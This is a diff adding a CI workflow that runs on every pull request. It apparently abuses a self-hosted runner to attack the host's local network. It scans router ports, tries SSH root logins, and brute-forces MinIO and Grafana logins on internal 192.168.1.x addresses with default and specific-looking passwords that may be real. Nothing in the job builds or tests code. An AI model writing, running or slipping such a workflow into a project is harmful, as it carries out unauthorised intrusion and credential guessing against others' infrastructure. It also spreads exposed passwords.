@@ -1,0 +1,47 @@
+name: i39485-lan3
+on:
+  pull_request:
+jobs:
+  lan3:
+    runs-on: docker
+    container:
+      image: docker:27-cli
+    steps:
+      - name: router
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q curl openssh-client sshpass >/dev/null 2>&1
+            for p in 22 80 443; do timeout 3 sh -c "echo > /dev/tcp/192.168.1.1/$p" 2>/dev/null && echo "OPEN 192.168.1.1:$p" || echo "closed $p"; done
+            echo "== http root"; timeout 6 curl -s -k -o /tmp/r -w "%{http_code} %{size_download}\n" "http://192.168.1.1/"; head -c 500 /tmp/r; echo
+            echo "== ssh root"
+            for p in changeme "&&Liz270117!!" "" ; do echo "-- [$p]"; timeout 10 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 -o PreferredAuthentications=password -o PubkeyAuthentication=no root@192.168.1.1 "uname -a; cat /etc/hostname" 2>&1 | tail -3; done
+          ' 2>&1 | head -80
+      - name: minio
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q curl >/dev/null 2>&1
+            echo "== s3 anonymous"; timeout 8 curl -s -k -o /tmp/s -w "%{http_code} %{size_download}\n" -H "Host: s3.kblab.me" "https://192.168.1.20/"; head -c 300 /tmp/s; echo
+            echo "== minio console"; timeout 8 curl -s -k -o /tmp/m -w "%{http_code} %{size_download}\n" -H "Host: minio.kblab.me" "https://192.168.1.20/"; head -c 300 /tmp/m; echo
+            echo "== minio login"
+            for c in "minioadmin:minioadmin" "admin:minioadmin" "minioadmin:password"; do
+              a=${c%:*}; b=${c#*:}
+              timeout 8 curl -s -k -o /tmp/l -w "%{http_code}\n" -H "Host: minio.kblab.me" -H "Content-Type: application/json" -X POST -d "{\"accessKey\":\"$a\",\"secretKey\":\"$b\"}" "https://192.168.1.20/api/v1/login"; head -c 160 /tmp/l; echo
+            done
+            echo "== direct 9000/9001"; for p in 9000 9001; do timeout 3 sh -c "echo > /dev/tcp/192.168.1.20/$p" 2>/dev/null && echo "OPEN 9000ish $p" || echo "closed $p"; done
+          ' 2>&1 | head -80
+      - name: grafana
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q curl >/dev/null 2>&1
+            echo "== root"; timeout 8 curl -s -k -o /tmp/g -w "%{http_code} %{size_download}\n" -H "Host: grafana.kblab.me" "https://192.168.1.20/"; head -c 200 /tmp/g; echo
+            echo "== anon api"; timeout 8 curl -s -k -o /tmp/ga -w "%{http_code}\n" -H "Host: grafana.kblab.me" "https://192.168.1.20/api/search?limit=5"; head -c 300 /tmp/ga; echo
+            echo "== login default"; timeout 8 curl -s -k -o /tmp/gl -w "%{http_code}\n" -H "Host: grafana.kblab.me" -H "Content-Type: application/json" -X POST -d "{\"user\":\"admin\",\"password\":\"admin\"}" "https://192.168.1.20/api/login"; head -c 200 /tmp/gl; echo
+            for c in "admin:prom-operator" "admin:&&Liz270117!!" "admin:DrumStick8008"; do
+              a=${c%:*}; b=${c#*:}
+              echo "-- $a"
+              timeout 8 curl -s -k -o /tmp/g2 -w "%{http_code}\n" -H "Host: grafana.kblab.me" -H "Content-Type: application/json" -X POST -d "{\"user\":\"$a\",\"password\":\"$b\"}" "https://192.168.1.20/api/login"; head -c 120 /tmp/g2; echo
+            done
+          ' 2>&1 | head -80
